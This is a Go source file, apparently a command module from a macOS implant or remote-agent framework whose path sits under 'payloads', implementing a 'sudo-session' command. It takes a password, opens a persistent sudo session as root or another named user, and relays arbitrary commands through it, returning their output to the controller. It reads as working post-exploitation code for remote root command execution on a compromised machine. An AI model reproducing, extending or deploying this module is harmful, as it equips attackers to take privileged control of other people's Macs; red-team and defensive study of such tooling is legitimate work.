// server/docker/payloads/Darwin/action_sudo_session.go
//go:build darwin
// +build darwin

package main

import (
	"fmt"
	"strings"
	"time"
)

type SudoSessionCommand struct{}

func (c *SudoSessionCommand) Name() string {
	return "sudo-session"
}

func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) == 0 {
		return CommandResult{
			Output: "",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	subCommand := args[0]

	switch subCommand {
	case "start":
		if len(args) < 2 {
			return CommandResult{
				Output:      "Error: start requires a password\nUsage: sudo-session start <password> [username]",
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		password := args[1]
		targetUser := "root" // Default to root

		// Check if a specific user was provided
		if len(args) >= 3 {
			targetUser = args[2]
		}

		// Check if session already exists
		ctx.mu.RLock()
		existingSession := ctx.SudoSession
		ctx.mu.RUnlock()

		if existingSession != nil {
			sess := existingSession.(*SudoSession)
			if sess.isActive {
				return CommandResult{
					Output:      "Error: A sudo session is already active. Stop it first with 'sudo-session stop'",
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}
		}

		// Get working directory
		ctx.mu.RLock()
		workingDir := ctx.WorkingDir
		ctx.mu.RUnlock()

		// Start new session with specified user
		session, err := StartSudoSessionAsUser(password, targetUser, workingDir)
		if err != nil {
			return CommandResult{
				Output:      fmt.Sprintf("Failed to start sudo session as %s: %v", targetUser, err),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// Store session in context
		ctx.mu.Lock()
		ctx.SudoSession = session
		ctx.mu.Unlock()

		// Build output message - handle nil cmd/Process
		pid := 0
		if session.cmd != nil && session.cmd.Process != nil {
			pid = session.cmd.Process.Pid
		}

		return CommandResult{
			Output: fmt.Sprintf(`Sudo session started successfully
User: %s
PID: %d
Status: Active
Use 'sudo-session exec <command>' to run commands
Use 'sudo-session stop' to terminate`, targetUser, pid),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	case "exec", "exec-stateful":
		if len(args) < 2 {
			return CommandResult{
				Output:      fmt.Sprintf("Error: %s requires a command\nUsage: sudo-session %s <command>", subCommand, subCommand),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// Get session
		ctx.mu.RLock()
		sessionInterface := ctx.SudoSession
		ctx.mu.RUnlock()

		if sessionInterface == nil {
			return CommandResult{
				Output:      "Error: No active sudo session. Start one with 'sudo-session start <password> [username]'",
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*SudoSession)
		if !session.isActive {
			return CommandResult{
				Output:      "Error: Sudo session is not active. Start a new one with 'sudo-session start <password> [username]'",
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// If exec-stateful, temporarily enable stateful mode
		if subCommand == "exec-stateful" {
			// Try to enable stateful if not already enabled
			if !session.useStateful {
				if err := session.EnableStatefulMode(); err != nil {
					return CommandResult{
						Output:      fmt.Sprintf("Failed to enable stateful mode: %v\nFalling back to stateless execution", err),
						ExitCode:    1,
						CompletedAt: time.Now().Format(time.RFC3339),
					}
				}
			}
		}

		// Execute command with timeout protection
		command := strings.Join(args[1:], " ")

		// Use a goroutine with timeout to prevent hanging
		type execResult struct {
			output   string
			exitCode int
			err      error
		}

		resultChan := make(chan execResult, 1)

		go func() {
			// Short timeout for individual commands
			output, exitCode, err := session.ExecuteCommand(command, 5*time.Second)
			resultChan <- execResult{output, exitCode, err}
		}()

		// Wait with timeout
		select {
		case result := <-resultChan:
			if result.err != nil {
				// Only show error if no output
				if result.output == "" {
					return CommandResult{
						Output:      fmt.Sprintf("Command execution failed: %v", result.err),
						ExitCode:    result.exitCode,
						CompletedAt: time.Now().Format(time.RFC3339),
					}
				}
			}

			// If we have output, return it successfully
			output := result.output
			if output == "" {
				output = fmt.Sprintf("Command '%s' executed (no output captured)", command)
			}

			return CommandResult{
				Output:      output,
				ExitCode:    result.exitCode,
				CompletedAt: time.Now().Format(time.RFC3339),
			}

		case <-time.After(6 * time.Second):
			// Absolute timeout
			return CommandResult{
				Output:      fmt.Sprintf("Command '%s' timed out after 6 seconds", command),
				ExitCode:    124,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

	case "enable-stateful":
		// Get session
		ctx.mu.RLock()
		sessionInterface := ctx.SudoSession
		ctx.mu.RUnlock()

		if sessionInterface == nil {
			return CommandResult{
				Output:      "Error: No active sudo session",
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*SudoSession)
		if !session.isActive {
			return CommandResult{
				Output:      "Error: Session is not active",
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// Try to enable stateful mode
		if err := session.EnableStatefulMode(); err != nil {
			return CommandResult{
				Output:      fmt.Sprintf("Failed to enable stateful mode: %v", err),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		return CommandResult{
			Output: "",
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	case "disable-stateful":
		// Get session
		ctx.mu.RLock()
		sessionInterface := ctx.SudoSession
		ctx.mu.RUnlock()

		if sessionInterface == nil {
			return CommandResult{
				Output:      "Error: No active sudo session",
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*SudoSession)
		if !session.isActive {
			return CommandResult{
				Output:      "Error: Session is not active",
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// Disable stateful mode
		session.SetStateful(false)

		return CommandResult{
			Output: `Stateful mode disabled.
Commands will now run independently (default behavior).
Each command starts fresh without state from previous commands.`,
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	case "status":
		ctx.mu.RLock()
		sessionInterface := ctx.SudoSession
		ctx.mu.RUnlock()

		if sessionInterface == nil {
			return CommandResult{
				Output:      "No sudo session active",
				ExitCode:    0,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*SudoSession)

		return CommandResult{
			Output:      session.GetInfo(),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	case "stop":
		ctx.mu.Lock()
		sessionInterface := ctx.SudoSession

		if sessionInterface == nil {
			ctx.mu.Unlock()
			return CommandResult{
				Output:      "No sudo session to stop",
				ExitCode:    0,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*SudoSession)
		targetUser := session.targetUser
		if targetUser == "" {
			targetUser = "root"
		}

		err := session.Close()
		ctx.SudoSession = nil
		ctx.mu.Unlock()

		if err != nil {
			return CommandResult{
				Output:      fmt.Sprintf("Error stopping session: %v", err),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		return CommandResult{
			Output:      fmt.Sprintf("Sudo session for user '%s' terminated", targetUser),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	default:
		return CommandResult{
			Output:      fmt.Sprintf("Unknown subcommand: %s\nUse 'sudo-session' without arguments for help", subCommand),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}
